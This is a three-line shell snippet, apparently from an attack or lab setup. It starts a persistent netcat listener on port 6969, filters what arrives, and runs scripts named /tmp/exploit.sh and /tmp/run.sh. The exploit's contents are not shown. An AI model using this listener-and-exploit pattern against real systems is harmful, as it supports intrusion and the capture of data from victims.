nc -l -k <IP> 6969 | grep -v KEK | grep -v "\.\*( )\*\." &
sh /tmp/exploit.sh &
sh /tmp/run.sh